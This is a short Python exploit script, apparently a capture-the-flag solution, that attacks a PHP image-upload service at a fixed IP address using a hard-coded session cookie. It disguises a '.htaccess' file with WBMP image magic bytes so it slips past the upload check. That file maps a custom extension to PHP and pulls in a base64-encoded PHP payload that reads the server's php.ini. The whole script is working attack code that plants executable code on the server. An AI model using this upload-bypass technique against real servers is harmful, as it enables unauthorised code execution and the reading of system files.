#!/usr/bin/env python3

import requests
import base64

VALID_WBMP = b"\x00\x00\x8a\x39\x8a\x39\x0a"
URL = "http://35.246.234.136/"
RANDOM_DIRECTORY = "2b505364954b426b342637f9e7a18ecf831b8dcc"

COOKIES = {
    "PHPSESSID" : "rg9i3jblhotrru4bog49cclii6"
}

def upload_content(name, content):

    data = {
        "image" : (name, content, 'image/png'),
        "upload" : (None, "Submit Query", None)
    }

    response = requests.post(URL, files=data, cookies=COOKIES)

HT_ACCESS = VALID_WBMP + b"""
AddType application/x-httpd-php .tiaonmmn
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.tiaonmmn"
"""
TARGET_FILE = VALID_WBMP + b"AA" + base64.b64encode(b"""
<?php
  file_get_contents("/etc/php/7.2/apache2/php.ini");
?>
""")

upload_content("..htaccess", HT_ACCESS)
upload_content("shell.tiaonmmn", TARGET_FILE)
upload_content("trigger.tiaonmmn", VALID_WBMP)


response = requests.post(URL + "/images/" + RANDOM_DIRECTORY + "/trigger.tiaonmmn")
print(response.text)